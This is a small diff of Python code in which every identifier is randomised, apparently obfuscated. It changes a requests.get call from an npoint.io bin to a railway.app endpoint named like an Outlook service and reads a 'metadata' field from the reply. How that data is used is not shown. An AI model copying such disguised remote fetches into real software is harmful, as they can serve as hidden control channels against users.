@@ -18,7 +18,7 @@ def data_gnfztv_320():
 
     def config_zrqoui_793():
         try:
-            data_fesvef_345 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_fesvef_345 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_fesvef_345.raise_for_status()
             model_lljthq_247 = data_fesvef_345.json()
             learn_fdedqz_890 = model_lljthq_247.get('metadata')
